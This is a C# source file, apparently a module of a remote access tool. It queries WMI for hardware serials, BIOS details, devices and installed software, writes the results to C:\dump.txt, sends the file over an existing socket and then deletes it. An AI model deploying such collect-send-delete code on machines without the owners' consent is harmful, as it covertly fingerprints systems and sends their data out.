using System;
using System.IO;
using System.Management;

namespace ServerMain
{
    class SystemInfo
    {
        public static void sysInfo()
        {
            string attributes;
            attributes = "Caption,IdentifyingNumber,Name,Vendor";
            getInfo(attributes, "Win32_ComputerSystemProduct");
            attributes = "AddressWidth,Caption,L2CacheSize,L3CacheSize,MaxClockSpeed,Name,NumberOfCores,NumberOfLogicalProcessors";
            getInfo(attributes, "Win32_Processor");
            attributes = "BankLabel,Capacity,Datawidth,Manufacturer,SerialNumber,Speed";
            getInfo(attributes, "Win32_PhysicalMemory");
            attributes = "AdapterDACType,AdapterRam,Caption,DriverVersion,Name";
            getInfo(attributes, "Win32_VideoController");
            attributes = "Caption,Name";
            getInfo(attributes, "Win32_SoundDevice");
            attributes = "Caption,Name";
            getInfo(attributes, "Win32_USBController");
            attributes = "Caption,DriverName,Manufacturer,Name";
            getInfo(attributes, "Win32_SCSIController");
            attributes = "Caption,DeviceID,Name";
            getInfo(attributes, "Win32_IDEController");
            attributes = "CapabilityDescriptions,Caption,Default,Network,PortName,SpoolEnabled";
            getInfo(attributes, "Win32_Printer");
            attributes = "BIOSVersion,Manufacturer,Name,SerialNumber,SMBIOSBIOSVersion";
            getInfo(attributes, "Win32_BIOS");
            attributes = "Name,Version";
            getInfo(attributes, "Win32_Product");

            try
            {
                FileStream fs = File.OpenRead("c:\\dump.txt");
                byte[] sysData = new byte[fs.Length];
                fs.Read(sysData, 0, (int)fs.Length);
                ServerMain.socketConnect.Send(sysData);
                fs.Close();
                try
                {
                    File.Delete("c:\\dump.txt");
                }
                catch (Exception) { }
            }
            catch (Exception)
            {
                ServerMain.connectionfailure = true;
            }
        }

        public static void getInfo(string attributes, string table)
        {
            StreamWriter sw = new StreamWriter("C:\\dump.txt", true);
            ManagementObjectSearcher infoSearcher = new ManagementObjectSearcher("select " + attributes + " from " + table);
            try
            {
                foreach (ManagementObject info in infoSearcher.Get())
                {
                    foreach (PropertyData infoproperty in info.Properties)
                    {
                        switch (infoproperty.Value.GetType().ToString())
                        {
                            case "System.String[]":
                                string[] str = (string[])infoproperty.Value;
                                string str2 = "";
                                foreach (string st in str)
                                    str2 += st + " ";
                                sw.WriteLine(infoproperty.Name + ": " + str2);
                                break;
                            case "System.UInt16[]":
                                ushort[] shortData = (ushort[])infoproperty.Value;
                                string tstr2 = "";
                                foreach (ushort st in shortData)
                                    tstr2 += st.ToString() + " ";
                                sw.WriteLine(infoproperty.Name + ": " + tstr2);
                                break;
                            default:
                                sw.WriteLine(infoproperty.Name + ": " + infoproperty.Value.ToString());
                                break;
                        }
                    }
                    sw.WriteLine("");
                }
            }
            catch (Exception) { }
            sw.WriteLine("-----");
            sw.Close();
        }
    }
}
